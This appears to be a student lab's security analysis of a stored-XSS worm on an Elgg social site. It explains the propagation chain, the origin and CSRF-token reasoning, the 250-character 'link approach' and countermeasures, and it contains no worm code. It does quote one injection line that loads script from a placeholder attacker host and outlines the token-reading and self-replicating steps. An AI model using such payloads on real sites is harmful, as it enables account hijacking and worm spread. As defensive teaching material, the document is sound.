# Self-Propagation Analysis (Theory)

> **Boundary.** This document is a *security analysis*. It explains **how** a
> stored-XSS worm would propagate and **why** that is dangerous, so the team can
> present and defend the concept. It contains **no working worm code** and no
> autonomous replication logic. The only code actually executed in this project
> is the harmless `demo.js`. Autonomous self-propagation is marked **PARTIAL /
> analysis-only** in the requirements matrix and must never be marked COMPLETE.

## 1. The hypothetical chain: Samy → Alice → Boby

1. **Seed.** Samy stores a short reference in his *Brief Description*:
   `<script src="http://<attacker-host>/xssworm.js">`.
2. **Victim visit.** Alice (logged in) opens Samy's profile. Elgg renders the
   stored reference verbatim (encoding disabled), so Alice's browser fetches and
   executes `xssworm.js` **in the Elgg origin, as Alice**.
3. **In-origin actions (theoretical).** Running as Alice, the script *could*:
   - read `elgg.security.token.__elgg_ts` / `__elgg_token` from the page;
   - issue same-origin requests to `/action/friends/add` and
     `/action/profile/edit` (the endpoints in
     [http-profile-workflows.md](http-profile-workflows.md));
   - write the **same** `<script src=...>` reference into Alice's own Brief
     Description (replication), and set her About me to the defacement string.
4. **Propagation.** Now Alice's profile carries the reference. When **Boby**
   views Alice's profile, the same thing happens to Boby — and so on. The worm
   spreads along the *who-views-whom* graph without any further attacker action.

```
Samy (seed) ──Alice views──▶ Alice (infected) ──Boby views──▶ Boby (infected) ──▶ …
```

Diagrams: [self-propagation-sequence.mmd](../diagrams/self-propagation-sequence.mmd),
[self-propagation-dataflow.mmd](../diagrams/self-propagation-dataflow.mmd).

## 2. Browser execution context — why this is possible

- An injected `<script>` executes with the **origin of the page that hosts it**
  (`http://www.seed-server.com`), not the origin of the file's host. So a script
  *fetched from* `attacker-host:8000` still runs *as* Elgg once loaded.
- Same-origin code can read any page global, including the CSRF token Elgg
  publishes at `elgg.security.token.*`. Hence the token does not protect against
  in-origin code (see [CSRF-vs-XSS](http-profile-workflows.md#5-why-csrf-tokens-are-not-a-defense-against-xss)).
- The ambient **session cookie** is attached automatically to same-origin
  requests, so the forged action is performed with the victim's authenticated
  identity.
- Because the payload is **stored**, it is re-served to *every* later visitor —
  the property that turns a single injection into a self-sustaining worm.

## 3. The length constraint and the "link approach"

A **self-contained** worm (the lecture's `self_propogating.js`) embeds a copy of
its own source and re-posts it (a quasi-quine using `document.getElementById`).
That text is far longer than 250 characters, so it cannot live in Brief
Description.

The **link approach** sidesteps the limit: Brief Description stores only the
short `<script src=URL>` reference, and the heavy logic lives in the external
file. Replication then only needs to re-insert the **same short reference** into
the next victim's field — which *does* fit in 250 characters. This is why the
assignment requires an external web server, and it is the conceptual heart of the
task. We demonstrate the *loading* half harmlessly with `demo.js`; the
*self-insertion* half is described here but intentionally not implemented.

## 4. Risks of replicating malicious content

- **Exponential reach.** Propagation follows profile views, so a popular profile
  can infect many accounts quickly (the historical MySpace "Samy" worm reached
  ~1M profiles in ~20 hours).
- **Persistence & re-infection.** Because it is stored, cleaning one profile does
  not stop re-infection from still-infected profiles; remediation must be global.
- **Authenticated abuse.** Running as the victim, the code can perform any action
  the victim can — spam, data changes, privilege-dependent operations.
- **Blast radius beyond the demo action.** A real worm's "payload" could be far
  worse than a defacement string; the self-propagation engine is the dangerous
  part, independent of what it carries.
- **This is why the project refuses to build it.** The learning objective is to
  *understand and defend*, which needs analysis, not a live weapon.

## 5. Theoretical vs. experimentally demonstrated — explicit split

| Step | Status in this project |
|---|---|
| Stored payload in Brief Description is rendered and executes | **Demonstrated** (harmless `demo.js`) |
| External `.js` is fetched from a web server and runs in Elgg origin | **Demonstrated** (Network + Console, correct MIME) |
| Payload fits the 250-char limit via the link approach | **Demonstrated** (payload validator) |
| Cross-account delivery (Alice sees Samy's stored payload) | **Demonstrated manually** (Alice views Samy) |
| Script reads `elgg.security.token.*` and forges `/action/*` calls | **Theory only** (explained, not executed) |
| Script writes the reference into the viewer's own profile (replication) | **Theory only** (explained, not executed) |
| Autonomous chain Samy→Alice→Boby without human action | **Theory only** — never run |

## 6. Safe manual counterpart (what the team actually does)

Instead of an autonomous worm, the team demonstrates each capability **manually
and observably**:

- Manually place the harmless reference in Samy's Brief Description; observe
  execution as Samy and as Alice (two separate, human logins).
- Manually perform an add-friend and a profile edit **as the account owner**, and
  inspect the HTTP requests in DevTools (documented, sanitized).
- Explain, with the diagrams, how an attacker would chain these — and show the
  three countermeasures (output encoding, input filtering, CSP) that each break
  the chain.

This yields the same *understanding* and presentation value as the worm, with
none of the risk, and it is honest about the boundary between what was run and
what was only reasoned about.

## 7. Countermeasures (how to break the chain)

1. **Output encoding (primary).** Re-enable `htmlspecialchars` in
   `output/text.php`; the stored reference renders as inert text. Chain broken at
   step 2.
2. **Input filtering.** HTMLawed/jsoup strips `<script>`/`src`/`onerror` on save,
   so the reference never reaches storage.
3. **CSP.** `script-src 'self' 'nonce-…'` blocks both inline injection and
   `src` loads from the attacker host. Chain broken at step 2/3.
4. **Shorten token lifetime / don't expose it to page JS** — helps marginally but
   does **not** stop same-origin XSS; not a substitute for 1–3.
